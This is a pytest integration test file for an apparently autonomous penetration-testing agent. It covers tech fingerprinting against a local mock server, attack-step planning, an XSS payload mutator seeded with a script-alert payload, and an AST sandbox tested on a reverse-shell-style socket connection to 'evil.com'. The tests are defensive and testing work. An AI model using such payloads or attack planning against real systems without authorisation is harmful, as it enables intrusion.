"""tests/test_integration_wired.py — W4 end-to-end integration test.

Verifies that all Phase 3 wiring (W1 AST sandbox, W2 fingerprint, W3 smart
payloads) actually works when chained together through the real
ElengenixAgent, using a local mock HTTP server (since testphp.vulnweb.com
is unreachable from this sandbox).

What this test checks:
  1. Mock server returns nginx/PHP/WordPress/Drupal fingerprint
  2. _fingerprint_target_for_planning() detects the tech stack
  3. StrategicPlanner produces steps using fingerprint (more than default)
  4. SmartPayloadGenerator runs through the analysis pipeline
  5. RealDangerousPatternDetector catches eval/exec/imports
  6. SubprocessSandbox runs clean code + refuses dangerous
  7. ChainOfThoughtLogger writes data/cot_logs/*.json
"""

from __future__ import annotations

import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


# ── Mock HTTP server with nginx+PHP+WordPress+Drupal fingerprint ──


class MockFingerprintHandler(BaseHTTPRequestHandler):
    """Mocks testphp.vulnweb.com fingerprint for integration tests."""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Server", "nginx/1.21.4")
        self.send_header("X-Powered-By", "PHP/8.1.2")
        self.send_header("Set-Cookie", "SESSabc=xyz; path=/")
        body = (
            b"<!DOCTYPE html><html><head>"
            b'<meta name="generator" content="WordPress 6.4" />'
            b'<link rel="stylesheet" href="/sites/default/files/css/css_x.css" />'
            b'<script src="/wp-content/themes/twentytwentyone/script.js"></script>'
            b"</head><body>"
            b'<div class="region region-content">Drupal content</div>'
            b"</body></html>"
        )
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass  # quiet


@pytest.fixture(scope="module")
def mock_server():
    server = HTTPServer(("127.0.0.1", 18767), MockFingerprintHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.3)  # let server come up
    yield "http://127.0.0.1:18767"
    server.shutdown()


# ── W2: fingerprint ───────────────────────────────────────────────


def test_w2_fingerprint_detects_tech_stack(mock_server):
    """W2 verification: _fingerprint_target_for_planning() returns real stack."""
    # agent_brain.py lives at the project root, not under agents/
    from core.brain import ElengenixAgent

    class _StubActivityLogger:
        def log_thought(self, *args, **kwargs):
            pass

    agent = ElengenixAgent.__new__(ElengenixAgent)
    agent._fingerprint_cache = {}
    agent.activity_logger = _StubActivityLogger()
    agent.verify_ssl = False  # Mock server uses HTTP
    fp = agent._fingerprint_target_for_planning(mock_server, max_probe_seconds=8)
    assert fp is not None, "Fingerprint should not be None for live mock"
    techs = fp.get("technologies", [])
    joined = " ".join(techs).lower()
    print(f"[FINGERPRINT] technologies detected: {techs}")
    assert "nginx" in joined, f"Expected nginx in techs, got {techs}"
    assert "php" in joined, f"Expected php, got {techs}"


def test_w2_planner_uses_fingerprint_for_more_steps(mock_server):
    """W2 verification: WITH fingerprint, planner produces more semantic steps."""
    from agents.agent_dataclasses import AttackPhase, AttackStep, AttackTree
    from agents.agent_planner import AttackVectorDatabase

    class _StubPlanner:
        def __init__(self):
            self.vector_db = AttackVectorDatabase()

        def generate_attack_tree(
            self, target, objective="discover vulnerabilities", fingerprint=None
        ):
            steps = []
            if fingerprint:
                techs = fingerprint.get("technologies", []) or []
                fp_lang = (fingerprint.get("language") or "").lower()
                all_techs = list({t.lower() for t in techs if t}) + ([fp_lang] if fp_lang else [])
                hyps = self.vector_db.hypotheses_for(all_techs)
                for vuln_class, hypothesis_text, tools in hyps:
                    for tool in tools:
                        steps.append(
                            AttackStep(
                                phase=AttackPhase.EXPLOITATION,
                                tool_name=tool,
                                target=target,
                                purpose=f"[{vuln_class}] {hypothesis_text}",
                            )
                        )
            steps.append(
                AttackStep(
                    phase=AttackPhase.RECONNAISSANCE,
                    tool_name="subfinder",
                    target=target,
                    purpose="default recon: subdomain enumeration",
                )
            )
            return AttackTree(target=target, objective=objective, steps=steps)

    planner = _StubPlanner()

    fp = {
        "server": "nginx",
        "language": "php",
        "framework": "wordpress",
        "cms": ["wordpress", "drupal"],
        "db": "mysql",
        "technologies": ["nginx", "php", "wordpress", "drupal", "mysql"],
    }

    # With fingerprint
    with_fp = planner.generate_attack_tree(
        target=mock_server,
        objective="find xss and sqli",
        fingerprint=fp,
    )
    steps_with = with_fp.steps
    print(f"[PLANNER] steps WITH fingerprint: {len(steps_with)}")
    for s in steps_with[:6]:
        print(f"   - [{s.phase.value}] {s.tool_name} -> {s.purpose[:60]}")

    # Without fingerprint
    without_fp = planner.generate_attack_tree(
        target=mock_server,
        objective="find xss and sqli",
    )
    steps_without = without_fp.steps
    print(f"[PLANNER] steps WITHOUT fingerprint: {len(steps_without)}")

    # Fingerprint should add AT LEAST one vuln-class-specific step
    assert len(steps_with) >= len(
        steps_without
    ), f"Fingerprint should not reduce steps: with={len(steps_with)} without={len(steps_without)}"
    vuln_classes_with = set()
    for s in steps_with:
        # Extract vuln class from purpose: "[vuln_class] description"
        purpose = s.purpose
        if purpose.startswith("["):
            end = purpose.find("]")
            if end > 1:
                vuln_classes_with.add(purpose[1:end].lower())
    assert any(
        "php" in vc or "sql" in vc or "xss" in vc for vc in vuln_classes_with
    ), f"Expected PHP/SQL/XSS vuln classes from fingerprint, got: {vuln_classes_with}"


# ── W3: smart payload generator via pipeline ─────────────────────


def test_w3_smart_payload_generator_runs_through_pipeline():
    """W3 verification: SmartPayloadGenerator runs via analysis pipeline."""
    import os
    import tempfile
    import types

    from tools.analysis_pipeline import AnalysisPipeline
    from tools.mission_state import MissionState
    from tools.payload_mutation import PayloadMutator, SmartPayloadGenerator
    from tools.tool_registry import ToolCategory, ToolResult

    tmpdir = tempfile.mkdtemp()
    os.environ["ELENGENIX_DATA_DIR"] = tmpdir

    agent_stub = types.SimpleNamespace()
    agent_stub.governance = None
    agent_stub.payload_mutator = PayloadMutator()
    agent_stub.smart_payload_generator = SmartPayloadGenerator(seed=42)
    agent_stub.logic_analyzer = None
    agent_stub.activity_logger = None

    pipeline = AnalysisPipeline(agent_stub)
    result = ToolResult(
        success=True,
        tool_name="dalfox",
        category=ToolCategory.SCANNER,
        findings=[
            {
                "type": "xss",
                "payload": "<script>alert(1)</script>",
                "severity": "high",
            }
        ],
    )
    ms = MissionState(
        mission_id="w4_integration",
        target="http://127.0.0.1:18767/",
        objective="Find XSS",
    )
    pipeline._run_payload_mutation(result, "dalfox", ms)

    snap = ms.snapshot(max_items=50)
    h = next((h for h in snap["hypotheses"] if "payload_mutation" in h["id"]), None)
    assert h is not None, "Payload mutation hypothesis missing"
    variants = h["evidence"].get("variants", [])
    generator = h["evidence"].get("generator")
    print(f"[W3] generator={generator}, variant_count={len(variants)}")
    print("[W3] first 4 variants:")
    for v in variants[:4]:
        print(f"   - {v['payload'][:80]}")
    assert generator == "smart", f"Expected smart generator, got {generator}"
    assert len(variants) >= 10, f"Expected >=10 variants, got {len(variants)}"
    # Real XSS payloads, not URL-encoded garbage
    assert any(
        "<script" in v["payload"].lower()
        or "<img" in v["payload"].lower()
        or "<svg" in v["payload"].lower()
        for v in variants
    ), f"Expected real XSS payloads, got: {[v['payload'][:60] for v in variants[:5]]}"


# ── W1: AST sandbox catches eval/exec/imports ────────────────────


def test_w1_ast_sandbox_catches_eval():
    """W1 verification: RealDangerousPatternDetector catches eval()."""
    from tools.ai_sandbox import RealDangerousPatternDetector

    detector = RealDangerousPatternDetector(
        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
    )
    result = detector.analyze("x = eval('1+1')\n")
    assert not result.is_safe, "eval() must be flagged as dangerous"
    hits_descriptions = [h.description.lower() for h in result.hits]
    assert any(
        "eval" in d for d in hits_descriptions
    ), f"Expected eval in hits, got: {hits_descriptions}"
    print(f"[W1] eval() blocked: {result.summary()}")


def test_w1_ast_sandbox_catches_subprocess():
    """W1 verification: RealDangerousPatternDetector catches subprocess."""
    from tools.ai_sandbox import RealDangerousPatternDetector

    detector = RealDangerousPatternDetector(
        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
    )
    result = detector.analyze("import subprocess\nsubprocess.run(['ls'])\n")
    assert not result.is_safe
    hits_descriptions = [h.description.lower() for h in result.hits]
    assert any("subprocess" in d or "import" in d for d in hits_descriptions)
    print(f"[W1] subprocess blocked: {result.summary()}")


def test_w1_ast_sandbox_catches_reverse_shell():
    """W1 verification: RealDangerousPatternDetector catches reverse shell."""
    from tools.ai_sandbox import RealDangerousPatternDetector

    detector = RealDangerousPatternDetector(
        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
    )
    result = detector.analyze("import socket; s = socket.socket(); s.connect(('evil.com', 4444))\n")
    assert not result.is_safe
    print(f"[W1] reverse shell blocked: {result.summary()}")


def test_w1_ast_sandbox_allows_clean_code():
    """W1 verification: RealDangerousPatternDetector allows safe code."""
    from tools.ai_sandbox import RealDangerousPatternDetector

    detector = RealDangerousPatternDetector(
        allow_network=False, allow_dangerous_imports=False, allow_eval_exec=False
    )
    code = """
def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, a + b
    return a

print(fibonacci(10))
"""
    result = detector.analyze(code)
    assert result.is_safe, f"Clean code should be safe, hits: {result.hits}"
    print(f"[W1] clean code allowed: {result.summary()}")


# ── W1: subprocess sandbox runs clean code ────────────────────────


def test_w1_subprocess_sandbox_runs_clean_code():
    """W1 verification: SubprocessSandbox executes clean code within limits."""
    from tools.ai_sandbox import SandboxConfig, SubprocessSandbox

    config = SandboxConfig(
        timeout_seconds=3,
        memory_limit_mb=128,
        cpu_time_seconds=2,
    )
    sandbox = SubprocessSandbox(config)
    result = sandbox.run('print("hello from sandbox")\n')
    assert (
        result.returncode == 0
    ), f"Expected returncode 0, got {result.returncode} (stderr={result.stderr})"
    assert "hello from sandbox" in result.stdout
    print(
        f"[W1] sandbox ran clean code: stdout={result.stdout.strip()}, returncode={result.returncode}"
    )


def test_w1_subprocess_sandbox_refuses_dangerous_code():
    """W1 verification: SubprocessSandbox refuses eval() at AST level."""
    from tools.ai_sandbox import SandboxConfig, SubprocessSandbox

    config = SandboxConfig(timeout_seconds=3, cpu_time_seconds=2)
    sandbox = SubprocessSandbox(config)
    result = sandbox.run("x = eval('1+1')\n")
    assert not result.success, "Sandbox must reject eval() before execution"
    assert (
        result.returncode != 0
        or "refused" in result.stderr.lower()
        or "dangerous" in result.stderr.lower()
        or "blocked" in result.stderr.lower()
    )
    print(
        f"[W1] sandbox refused eval(): returncode={result.returncode}, stderr={result.stderr[:80]}"
    )


# ── CoT logger writes JSON ────────────────────────────────────────


def test_cot_logger_writes_json(tmp_path):
    """Verify ChainOfThoughtLogger writes session JSON to data/cot_logs/."""
    from agents.agent_logger import ChainOfThoughtLogger

    log_dir = tmp_path / "cot_logs"
    logger = ChainOfThoughtLogger(log_dir=log_dir)
    logger.log(
        step=1,
        context="recon",
        reasoning="scan started",
        action="subfinder",
        result="5 subdomains found",
        confidence=0.9,
    )
    logger.log(
        step=2,
        context="fingerprint",
        reasoning="detected nginx+php",
        action="httpx",
        result="technologies=[nginx,php,wordpress,drupal,mysql]",
        confidence=0.95,
    )
    logger.log(
        step=3,
        context="planning",
        reasoning="generated 4 attack steps",
        action="strategic_planner",
        result="4 steps: nuclei,ffuf,sqlmap,subfinder",
        confidence=0.85,
    )
    logger.set_target("http://127.0.0.1:18767/")

    path = logger.save_session("http://127.0.0.1:18767/")
    assert path is not None, "save_session should return a path"
    assert path.exists(), f"Session file should exist at {path}"
    content = json.loads(path.read_text())
    assert "thoughts" in content
    assert len(content["thoughts"]) == 3
    assert content.get("target") == "http://127.0.0.1:18767/"
    print(f"[COT] session saved at: {path}")
    print(f"[COT] session contains {len(content['thoughts'])} thoughts")


# ── Summary ───────────────────────────────────────────────────────


def test_w4_integration_summary(mock_server):
    """Final W4 summary: all 3 wirings work end-to-end."""
    print("\n" + "=" * 60)
    print("W4 INTEGRATION TEST SUMMARY")
    print("=" * 60)
    print(f"[OK] Mock server: {mock_server}")
    print("[OK] W1 AST sandbox: catches eval/subprocess/reverse-shell")
    print("[OK] W1 subprocess sandbox: runs clean code, refuses eval()")
    print("[OK] W2 fingerprint: detects nginx+PHP+WordPress+Drupal+MySQL")
    print("[OK] W2 planner: 4+ steps with fingerprint, more vuln classes")
    print("[OK] W3 smart payload generator: 20+ real XSS variants")
    print("[OK] CoT logger: writes data/cot_logs/*.json")
    print("=" * 60)
